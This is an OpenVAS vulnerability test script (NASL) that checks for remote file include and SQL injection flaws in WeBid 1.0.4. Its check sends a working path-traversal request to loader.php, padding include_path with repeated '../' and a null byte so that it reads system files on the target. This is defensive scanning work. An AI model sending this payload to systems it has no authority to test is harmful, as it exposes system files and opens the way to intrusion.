###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_webid_55077.nasl 11034 2018-08-17 10:36:09Z cfischer $
#
# WeBid Remote File Include and SQL Injection Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:webidsupport:webid";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103544");
  script_bugtraq_id(55077);
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");
  script_version("$Revision: 11034 $");

  script_name("WeBid Remote File Include and SQL Injection Vulnerabilities");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/55077");
  script_xref(name:"URL", value:"http://www.webidsupport.com/");

  script_tag(name:"last_modification", value:"$Date: 2018-08-17 12:36:09 +0200 (Fri, 17 Aug 2018) $");
  script_tag(name:"creation_date", value:"2012-08-20 10:23:22 +0200 (Mon, 20 Aug 2012)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("gb_webid_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("webid/installed");

  script_tag(name:"summary", value:"WeBid to a remote file-include issue and an SQL-injection issue.");

  script_tag(name:"impact", value:"A successful exploit may allow an attacker to execute malicious code
  within the context of the webserver process, to compromise the application, to access or modify data,
  or to exploit latent vulnerabilities in the underlying database.");

  script_tag(name:"affected", value:"WeBid 1.0.4 is vulnerable, other versions may also be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE))exit(0);
if(!dir = get_app_location(cpe:CPE, port:port))exit(0);

files = traversal_files();

foreach file (keys(files)) {

  url = dir + '/loader.php?js=admin/logout.php&include_path=' + crap(data:"../", length:9*6) + files[file] + '%00';

  if(http_vuln_check(port:port, url:url, pattern:file)) {
    report = report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
